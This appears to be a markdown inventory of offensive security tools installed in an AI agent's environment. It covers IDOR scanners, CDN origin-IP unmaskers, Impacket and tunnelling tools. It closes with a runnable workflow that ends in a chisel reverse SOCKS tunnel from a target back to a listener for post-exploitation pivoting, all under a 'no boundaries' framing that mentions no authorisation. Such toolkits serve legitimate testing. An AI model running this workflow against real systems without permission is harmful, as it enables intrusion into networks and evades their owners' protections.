# Arsenal — Installed Toolkit
### June 28, 2026 — Full spectrum, no boundaries

---

## 🔥 IDOR Hunter Gems

| Tool | Location | What It Does |
|------|----------|-------------|
| **IDOR-Hunter-Pro** | `/tmp/tools/idor-hunter-pro/` | Autonomous IDOR scanner — manual/proxy/crawl modes, mitmproxy addon, HackerOne-ready reports |
| **IDOR-Hunter (the4ingmaster)** | `/tmp/tools/idor-hunter/` | UUID fuzzing, JWT analysis, GraphQL IDOR, POST body fuzzing, Burp import |
| **IDOR-CrawlerScanSuite** | `/tmp/tools/IDOR-CrawlerScanSuite/` | Intelligent crawler + IDOR detection, multi-format reports (HTML/JSON/CSV) |
| **IDOR-Forge** | `/tmp/tools/IDOR-Forge/` | Multi-method IDOR (GET/POST/PUT/DELETE), 15+ payload types, GUI mode |
| **xnLinkFinder-Z** | `/tmp/tools/xnLinkFinder-Z/` | 40+ scanners in one — IDOR auto, BOLA/BFLA, race conditions, SSTI, prototype pollution |
| **Indago** | `/usr/local/bin/indago` | LLM-powered API fuzzer — reads OpenAPI/Swagger, generates context-aware payloads |
| **Aura** (pending) | Go module issue | CLI IDOR/BOLA scanner with endpoint discovery from HTML/JS |
| **Doppel** (pending) | `/tmp/tools/Doppel/` | Rust-based BOLA/IDOR with semantic risk scoring + Ollama PII detection |
| **idotaku** (pending) | needs Python 3.12 | mitmproxy-based ID detection — tracks ID flow through traffic |

## 🕵️ Origin IP Unmaskers (CDN/Cloudflare Bypass)

| Tool | Location | What It Does |
|------|----------|-------------|
| **unearth** | `/usr/local/bin/unearth` | 17 recon techniques in parallel, cross-technique confidence scoring, no API keys needed |
| **revelar** | `/usr/local/bin/revelar` | Professional origin IP discovery, CDN detection, JSON+HTML reports, subfinder/amass integration |
| **origindive** | `/usr/local/bin/origindive` | Passive + active scanning, ASN-based, 108+ WAF/CDN range filtering, proxy support |
| **CloudFail** | `/tmp/tools/CloudFail/` | Multi-source (CT logs, passive DNS, Shodan, Censys) origin discovery, Tor support |
| **CloudRecon** | `/tmp/tools/CloudRecon/` | CrimeFlare replacement, free sources only, security header audit, WAF detection |
| **CDN-Unmasker** | `/tmp/tools/cdnunmasker/` | 9-stage chain (subdomain enum, DNS brute, vhost brute, SSL SAN, SPF, ASN check) |
| **subfinder** | `/usr/local/bin/subfinder` | Passive subdomain enumeration for origin discovery pivot |

## 💣 Exploitation & Post-Exploitation

| Tool | Location | What It Does |
|------|----------|-------------|
| **Impacket** | `/usr/local/bin/*.py` | Full Windows protocol suite — psexec, secretsdump, wmiexec, smbexec, dcomexec, kerberoast, etc. |
| **chisel** | `/usr/local/bin/chisel` | Fast TCP/UDP tunnel over HTTP, single binary |
| **ligolo-ng** | `/usr/local/bin/ligolo-ng-*` | Layer 3 VPN-like tunneling with SOCKS5 proxy |
| **nuclei** | `/usr/local/bin/nuclei` | Template-based vuln scanner (10.4.5 templates installed at ~/nuclei-templates/) |
| **commix** | `/tmp/tools/commix/` | Automated command injection exploitation |
| **CRLFsuite** | `/tmp/tools/CRLFsuite/` | CRLF injection scanner |
| **NoSQLMap** | `/tmp/tools/NoSQLMap/` | NoSQL injection and exploitation |
| **XSStrike** | `/tmp/tools/XSStrike/` | Context-aware XSS scanner with DOM analysis |
| **CORScanner** | `/tmp/tools/CORScanner/` | CORS misconfiguration scanner |
| **GitDorker** | `/tmp/tools/GitDorker/` | GitHub dorking for exposed secrets |

## 🔍 Recon & OSINT

| Tool | Location | What It Does |
|------|----------|-------------|
| **ffuf** | `/usr/local/bin/ffuf` | Web fuzzer (directories, parameters, vhosts) |
| **gau** | `/usr/local/bin/gau` | URL discovery from Wayback, OTX, CommonCrawl |
| **waybackurls** | `/usr/local/bin/waybackurls` | Wayback Machine URL fetcher |
| **httpx** | `/usr/local/bin/httpx` | HTTP probing and fingerprinting |
| **unfurl** | `/usr/local/bin/unfurl` | URL parsing and extraction |
| **GraphQLmap** | `/tmp/tools/GraphQLmap/` | GraphQL vulnerability scanner |
| **SecretFinder** | `/tmp/tools/SecretFinder/` | Find sensitive data in JS files |
| **LinkFinder** | `/tmp/tools/LinkFinder/` | Endpoint discovery in JS files |
| **ParamSpider** | `/tmp/tools/ParamSpider/` | Parameter mining from web archives |
| **s3scanner** | `pip3 installed` | AWS S3 bucket enumeration |
| **dnsgen** | `pip3 installed` | DNS permutation generator |
| **jwt-hack** | `/tmp/tools/jwt-hack/` | JWT scanning and tampering |
| **truffleHog** | `/usr/local/bin/trufflehog` | Secret scanning in git repos |
| **wafw00f** | `/usr/local/bin/wafw00f` | WAF fingerprinting |
| **arjun** | `pip3 installed` | Parameter discovery |
| **fsociety** | `/tmp/tools/fsociety/` | Multi-tool pentest framework |

## 🧩 Active Plugins

| Plugin | Type | Status |
|--------|------|--------|
| **superpowers@obra/superpowers** | opencode skill system | ✅ Active (loaded) |
| **headroom-opencode** | local plugin | ✅ Active at `.opencode/` |
| **freebuff v0.0.109** | npm devDep AI agent | ✅ Installed (`npx freebuff`) |

## 📁 Cloned Repos Reference

All at `/tmp/tools/`:
```
/tmp/tools/
├── idor-hunter-pro/        # Autonomous IDOR scanner
├── idor-hunter/            # Advanced IDOR with UUID/JWT/GraphQL
├── IDOR-CrawlerScanSuite/  # Crawler + IDOR detection
├── IDOR-Forge/             # Multi-method IDOR fuzzer
├── xnLinkFinder-Z/         # 40+ scanners endpoint discovery
├── Doppel/                 # Rust BOLA/IDOR detector (needs cargo update)
├── CloudFail/              # Origin IP behind Cloudflare
├── CloudRecon/             # CrimeFlare replacement
├── cdnunmasker/            # 9-stage origin IP discovery
├── commix/                 # Command injection
├── CRLFsuite/              # CRLF injection
├── NoSQLMap/               # NoSQL injection
├── XSStrike/               # Advanced XSS
├── CORScanner/             # CORS misconfiguration
├── GitDorker/              # GitHub dorking
├── GraphQLmap/             # GraphQL exploitation
├── SecretFinder/           # JS secrets
├── LinkFinder/             # JS endpoints
├── ParamSpider/            # Parameter mining
├── fsociety/               # Pentest framework
└── jwt-hack/               # JWT toolkit
```

## ⚡ Quick-Start IDOR + Origin IP Workflow

```bash
# 1. Find origin IP behind CDN
unearth -d target.com
revelar -d target.com
origindive -d target.com --passive

# 2. Enumerate subdomains (more surface area)
subfinder -d target.com | httpx -silent | tee live-subs.txt

# 3. Discover endpoints and params
python3 /tmp/tools/ParamSpider/paramspider.py -d target.com
python3 /tmp/tools/LinkFinder/linkfinder.py -i https://target.com -o cli

# 4. IDOR scan on discovered endpoints
cd /tmp/tools/idor-hunter-pro && python3 idor_hunter.py --mode manual --urls endpoints.txt

# 5. LLM-powered API fuzzing
indago scan --spec openapi.yaml --provider ollama --use-llm-payloads --attacks idor

# 6. Tunneling into internal networks (post-exploit)
chisel server --port 8080 --reverse  # on listener
chisel client LISTENER_IP:8080 R:1080:socks  # on target
```
